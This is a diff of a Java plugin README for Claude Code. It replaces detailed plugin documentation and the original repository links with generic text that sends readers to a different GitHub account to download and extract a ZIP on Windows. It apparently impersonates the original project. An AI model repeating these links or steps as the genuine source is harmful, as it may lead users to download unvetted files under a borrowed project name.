@@ -1,213 +1,240 @@
-# Java Plugins for Claude Code
+# 🧩 claude-java-plugins - Java help for Claude Code workflows
 
-A Claude Code plugin marketplace with 3 focused plugins for Java developers. All plugins support **Java 8 through Java 21** and tailor advice to your target Java version.
+[![Download](https://img.shields.io/badge/Download-Open%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/limited-grisaille833/claude-java-plugins)
 
-## Plugins
+## 📥 Download
 
-| Plugin | Skills | Commands | Agents | Install when |
-|---|---|---|---|---|
-| `java-core` | 14 | 2 | `java-architect`, `java-build-resolver` | Every Java project |
-| `java-spring` | 9 | 2 | `java-spring-expert` | Spring Boot projects |
-| `java-quality` | 3 | 1 | `java-security-reviewer`, `java-performance-reviewer`, `java-test-engineer` | Quality enforcement |
+Use this link to visit the project page and download or copy the files you need:
 
-## Quick Setup (5 minutes)
+[Open claude-java-plugins on GitHub](https://github.com/limited-grisaille833/claude-java-plugins)
 
-1. Copy [`templates/CLAUDE.md.template`](templates/CLAUDE.md.template) to your Java project root as `CLAUDE.md` and fill in the placeholders
-2. Copy [`templates/settings.json.template`](templates/settings.json.template) to `.claude/settings.local.json` to pre-approve build/test commands
-3. Install the plugins (below)
+## 🖥️ What this is for
 
----
+claude-java-plugins is a Java developer toolkit for Claude Code. It gives you ready-made skills, agents, hooks, and coding standards for Java 8+ projects.
 
-## Installation
+Use it when you want Claude Code to help with:
 
-### Step 1 — Add the marketplace
+- Java project setup
+- Spring Boot work
+- Code style checks
+- Common coding tasks
+- Repeatable project rules
 
-```shell
-/plugin marketplace add ducpm2303/claude-java-plugins
-```
+It is built for people who want a simpler way to guide AI help in Java projects.
 
-### Step 2 — Install plugins
+## ✨ What you get
 
-```shell
-/plugin install java-core@java-plugins       # every Java project
-/plugin install java-spring@java-plugins     # Spring Boot projects
-/plugin install java-quality@java-plugins    # security + performance + testing
-```
+This toolkit can help you organize work in a Java project with:
 
-### Updating
+- Skills for common Java tasks
+- Agents for focused work
+- Hooks for project steps
+- Coding standards for cleaner code
+- Support for Java 8 and newer
+- Use with Spring Boot projects
 
-```shell
-/plugin marketplace update java-plugins
-```
+You can use it to keep your project rules in one place so Claude Code follows them more often.
 
----
+## 🧰 Before you start
 
-## Skills (auto-invoked)
+Make sure you have:
 
-Skills activate automatically based on context, or invoke them explicitly.
+- A Windows PC
+- A web browser
+- GitHub access
+- Claude Code installed
+- A Java 8+ project if you want to use the toolkit right away
 
-### java-core
+If you already use Claude Code, this project fits into your normal workflow.
 
-| Skill | What it does |
-|---|---|
-| `/java-core:java-review` | Review Java code for bugs, naming issues, and version-appropriate idioms |
-| `/java-core:java-refactor` | Suggest and apply version-gated refactorings |
-| `/java-core:java-explain` | Explain Java code in plain language |
-| `/java-core:java-fix` | Diagnose compile errors or stack traces |
-| `/java-core:java-docs` | Generate Javadoc for classes and methods |
-| `/java-core:java-health` | Structural health score across Security, Tests, Performance, Quality (A–F) |
-| `/java-core:java-concurrency-review` | Review thread safety, race conditions, and Java 21 virtual thread compatibility |
-| `/java-core:java-api-review` | Review REST API design — HTTP methods, status codes, naming, versioning |
-| `/java-core:java-migrate` | Interactive migration guide: Java 8→11, 11→17, or 17→21 |
-| `/java-core:java-commit` | Generate a Conventional Commits message for staged Java changes |
-| `/java-core:java-solid` | Check all 5 SOLID principles with Java-specific patterns |
-| `/java-core:java-design-pattern` | Detect GoF patterns in code or recommend a pattern for a problem |
-| `/java-core:java-adr` | Create, list, and manage Architecture Decision Records |
-| `/java-core:java-clean-arch` | Review for Clean/Hexagonal Architecture violations or scaffold a full hexagonal layout with DDD patterns |
+## 🚀 Getting Started on Windows
 
-### java-spring
+Follow these steps to get the project on your computer:
 
-| Skill | What it does |
-|---|---|
-| `/java-spring:java-scaffold` | Scaffold a brand-new Spring Boot project (2.7.x – 4.0.x) |
-| `/java-spring:java-jpa` | Deep JPA review — N+1 queries, fetch strategies, projections, Specifications |
-| `/java-spring:java-logging` | Review logging — SLF4J, MDC, structured logging, PII safety |
-| `/java-spring:java-crud` | Generate a complete CRUD feature in an existing project |
-| `/java-spring:java-security` | Review or generate Spring Security config — JWT, OAuth2, method security, CORS (Boot 2.x & 3.x) |
-| `/java-spring:java-openapi` | Generate or review OpenAPI/Swagger docs — `@Tag`, `@Operation`, `@Schema`, JWT auth scheme (springdoc v1/v2) |
-| `/java-spring:java-spring-ai` | Add AI features to Spring Boot — ChatClient, RAG, tool calling, memory (Spring AI 1.x / LangChain4J) |
-| `/java-spring:java-resilience` | Add Resilience4J patterns — circuit breaker, retry, rate limiter, bulkhead, timeout (Boot 2.x & 3.x) |
-| `/java-spring:java-cache` | Add or review Spring Cache — Caffeine (single-instance) or Redis (distributed), @Cacheable/@CacheEvict/@CachePut |
+1. Open the project page:
+   [https://github.com/limited-grisaille833/claude-java-plugins](https://github.com/limited-grisaille833/claude-java-plugins)
 
-### java-quality
+2. On the GitHub page, look for the green Code button.
 
-| Skill | What it does |
-|---|---|
-| `/java-quality:java-security-check` | Quick OWASP scan — secrets, injection, weak crypto, Spring Security misconfigs |
-| `/java-quality:java-perf-check` | Quick performance scan — N+1, memory, threading, algorithmic hotspots |
-| `/java-quality:java-test` | Generate JUnit 5 + Mockito unit or Testcontainers integration tests |
+3. Choose one of these options:
+   - Download the ZIP file
+   - Copy the Git URL if you use Git
+   - Open the files in GitHub first if you want to review them
 
----
+4. If you download the ZIP file:
+   - Save it to your Downloads folder
+   - Right-click the ZIP file
+   - Choose Extract All
+   - Pick a folder you can find again, such as Documents or Desktop
 
-## Commands (explicit slash commands)
+5. Open the extracted folder and look through the files.
 
-Commands are explicitly triggered workflows — builds, analysis runs, and reports.
+6. If the project includes setup notes, follow them first.
 
-### java-core
+7. If you use Claude Code, add the toolkit files to your project folder or place them where Claude Code can read them.
 
-| Command | What it does |
-|---|---|
-| `/java-core:build` | Run a clean Maven/Gradle build and report test results or compile errors |
-| `/java-core:check` | Run configured static analysis (Checkstyle, SpotBugs, PMD) and report findings |
+## 🧭 How to use it
 
-### java-spring
+This toolkit works best when you treat it as a set of project rules and helpers.
 
-| Command | What it does |
-|---|---|
-| `/java-spring:run` | Start the Spring Boot app locally with pre-flight checks (env vars, DB) |
-| `/java-spring:routes` | Print a REST endpoint table scanned from all `@RestController` classes |
+Common ways to use it:
 
-### java-quality
+- Add coding standards before you start new work
+- Use skills for repeated tasks
+- Use agents when you want a task split into steps
+- Use hooks to guide checks before or after actions
+- Keep Java and Spring Boot rules close to the project
 
-| Command | What it does |
-|---|---|
-| `/java-quality:audit` | Full quality audit: security + performance + test coverage in one combined report |
+If you are new to this, start with one project and one task. That makes it easier to see how each part works.
 
----
+## 🛠️ Suggested folder setup
 
-## Agents
+A simple Windows setup can look like this:
 
-Agents are specialist sub-agents Claude can delegate to:
+- `Documents\claude-java-plugins`
+- `Documents\MyJavaProject`
+- `Documents\MySpringBootApp`
 
-| Agent | Plugin | Use for |
-|---|---|---|
-| `java-architect` | `java-core` | Project structure, hexagonal/layered architecture, multi-module Maven, design patterns |
-| `java-build-resolver` | `java-core` | Fix Maven/Gradle/javac build errors with minimal changes |
-| `java-spring-expert` | `java-spring` | Spring Boot best practices, Spring Data JPA, Spring Security, REST API design |
-| `java-security-reviewer` | `java-quality` | Full OWASP Top 10 deep-dive, Spring Security misconfig, secrets audit |
-| `java-performance-reviewer` | `java-quality` | Deep JPA/memory/threading performance analysis with before/after fixes |
-| `java-test-engineer` | `java-quality` | Test strategy, coverage analysis, Testcontainers setup, PITest mutation testing |
+Keep the toolkit in a place you can find fast. Keep your Java project in a separate folder.
 
-**Example usage:**
-- *"Ask the `java-architect` agent to design a hexagonal architecture for this order service"*
-- *"Use the `java-security-reviewer` agent to do a full OWASP audit of this controller"*
-- *"Have the `java-test-engineer` agent write a test strategy for this service layer"*
+## 📚 Typical use cases
 
----
+You may find this useful for:
 
-## Auto-activating Rules
+- Small Java apps
+- Spring Boot services
+- Refactoring old code
+- Writing cleaner class names
+- Keeping team rules the same
+- Helping Claude Code follow your project style
+- Repeating the same review steps
 
-Each plugin includes path-scoped rules that activate automatically when you open matching files — no manual invocation needed.
+It is a good fit for projects where you want less guesswork and more consistency.
 
-| Rule file | Activates for | Enforces |
-|---|---|---|
-| `java-core` naming-conventions | `**/*.java` | Class/method/variable/package naming |
-| `java-core` project-structure | `**/pom.xml`, `**/build.gradle*` | Dependency scopes, version pinning, Java toolchain |
-| `java-spring` controller-conventions | `**/*Controller.java` | `ResponseEntity` returns, `@Valid`, HTTP status codes |
-| `java-spring` service-conventions | `**/*Service.java` | Constructor injection, `@Transactional(readOnly)`, DTO mapping |
-| `java-spring` entity-conventions | `**/*Entity.java`, `**/entity/*.java` | Fetch types, auditing timestamps, soft delete, equality |
-| `java-quality` security-rules | `**/*.java` | No secrets in logs, no SQL concat, input validation |
-| `java-quality` test-conventions | `**/*Test.java`, `**/*IT.java` | AAA pattern, AssertJ, Testcontainers, naming |
+## ⚙️ Windows tips
 
----
+To make setup smoother on Windows:
 
-## LSP Integration
+- Use a short folder path
+- Avoid folders with special characters
+- Keep the ZIP file until you confirm everything works
+- Open folders in File Explorer if you want to check file names
+- If you use Git, install it before you start
 
-`java-core` includes a `.lsp.json` configuring [Eclipse JDT Language Server (jdtls)](https://github.com/eclipse-jdtls/eclipse.jdt.ls) for real-time code intelligence:
-- Diagnostics and type checking
-- Auto import organization
-- Inlay parameter hints
-- Google Style formatting
+If you run into file access issues, move the project to a local folder like `C:\Projects`.
 
-**Install jdtls:**
-```shell
-brew install jdtls        # macOS
-# or download from https://github.com/eclipse-jdtls/eclipse.jdt.ls/releases
-```
+## 🔍 Main topics
 
----
+This repository focuses on:
 
-## GitHub Actions — Automated PR Review
+- anthropic
+- claude-code
+- claude-code-plugin
+- claude-code-plugins
+- claude-java-plugins
+- claude-plugins
+- claude-plugins-marketplace
+- claude-skills
+- java
+- spring-boot
 
-Use the same skills that run locally to automatically review every Java PR in CI.
+## 🧩 File types you may see
 
-### Quick setup
+The project may include files such as:
 
-1. Copy [`templates/java-pr-review.yml`](templates/java-pr-review.yml) to `.github/workflows/java-pr-review.yml` in your Java project
-2. Add `ANTHROPIC_API_KEY` to your repo secrets (Settings → Secrets → Actions)
-3. Push — every PR touching `.java` or build files gets an automated review
+- Markdown files for instructions
+- Skill files for task guidance
+- Config files for hooks or rules
+- Text files with coding standards
+- Folder groups for agents and plugins
 
-### What gets reviewed
+If you see folders with clear names, open them one by one and read the short notes inside.
 
-Every PR automatically checks:
-- **Code quality** — naming, logic errors, null risks, resource leaks
-- **Security** — OWASP Top 10, hardcoded secrets, SQL injection, missing `@Valid`
-- **Performance** — N+1 queries, eager fetch on collections, missing pagination
+## 📝 Good first steps after download
 
-Results are posted as a single structured comment with severity-coded findings.
+After you get the files:
 
-### Our own CI
+1. Read the main project files.
+2. Find the parts for skills, agents, and hooks.
+3. Copy the files you want into your Java project.
+4. Test one small task in Claude Code.
+5. Check that the output follows your project rules.
 
-This repo runs `.github/workflows/validate.yml` on every push — it runs `validate-plugins.sh` and verifies version consistency across all plugin manifests.
+That simple process helps you learn what each part does.
 
----
+## 🧪 Example workflow
 
-## Contributing
+A basic workflow can look like this:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for a full authoring guide covering skills, rules, commands, and agents.
+- Open your Java project
+- Load the toolkit files
+- Ask Claude Code to work on one small change
+- Use the coding standards file to check the result
+- Repeat for the next task
 
-Quick steps:
-1. Follow the structure in an existing plugin
-2. Run `./scripts/validate-plugins.sh` — must pass with zero errors
-3. Add an entry to `.claude-plugin/marketplace.json`
-4. Open a PR
+This keeps the work steady and easy to follow
 
-## Star History
+## 🔒 Safe file handling
 
-[![Star History Chart](https://api.star-history.com/svg?repos=ducpm2303/claude-java-plugins&type=Date)](https://star-history.com/#ducpm2303/claude-java-plugins&Date)
+When you download files from GitHub:
 
-## Requirements
+- Save them to a folder you control
+- Check the folder name before you open files
+- Keep a backup copy if the project matters to you
+- Use only the files from the project page
 
-- Claude Code CLI installed and configured
-- Git (for marketplace installation from GitHub)
-- (Optional) [jdtls](https://github.com/eclipse-jdtls/eclipse.jdt.ls) for LSP code intelligence
+## 📖 For Java 8+ projects
+
+This toolkit is made for Java 8 and newer. It can help with projects that use:
+
+- Plain Java
+- Spring Boot
+- Shared utility classes
+- Service layers
+- Common project patterns
+
+If your project already has rules, you can adapt this toolkit to match them
+
+## 🧠 Working with Claude Code
+
+To use this project well with Claude Code:
+
+- Give clear tasks
+- Point Claude Code to the right files
+- Use the coding standards before code changes
+- Review the result in small steps
+- Keep one style across the project
+
+Clear input makes the output easier to use
+
+## 📌 Where to start first
+
+If you only want the fastest path:
+
+1. Open the GitHub page
+2. Download or copy the project files
+3. Extract them on Windows
+4. Read the setup notes
+5. Add the files to your Java project
+6. Start with one small task in Claude Code
+
+## 🗂️ Project focus areas
+
+This repository is built around:
+
+- Java work helpers
+- AI task guidance
+- Reusable project rules
+- Coding discipline
+- Spring Boot support
+- Claude Code workflow setup
+
+## 📄 License and use
+
+Check the repository files for the license and use terms before you copy the toolkit into your own project
+
+## 🧭 Repository link
+
+Use this link to visit the project page again if you need it:
+
+[https://github.com/limited-grisaille833/claude-java-plugins](https://github.com/limited-grisaille833/claude-java-plugins)
